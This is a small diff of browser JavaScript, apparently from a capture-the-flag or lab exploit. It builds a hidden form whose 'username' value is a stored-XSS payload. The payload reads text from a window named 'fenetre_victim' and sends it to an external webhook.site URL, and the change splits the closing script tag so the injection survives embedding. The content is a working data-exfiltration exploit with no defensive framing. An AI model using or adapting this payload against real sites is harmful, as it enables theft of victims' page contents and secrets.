@@ -11,7 +11,7 @@
         
         var u = document.createElement('input');
         u.type = 'hidden'; u.name = 'username'; 
-        u.value = "<script>var f = window.open('', 'fenetre_victim'); var secret = f.document.body.innerText;location.href = 'https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s=' + encodeURIComponent(secret);</script>";
+        u.value = `<script>var f = window.open('', 'fenetre_victim'); var secret = f.document.body.innerText;location.href = 'https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s=' + encodeURIComponent(secret);</scr` + `ipt>`;
         f.appendChild(u);
         var p = document.createElement('input');
         p.type = 'hidden'; p.name = 'secret'; p.value = '1234'; 
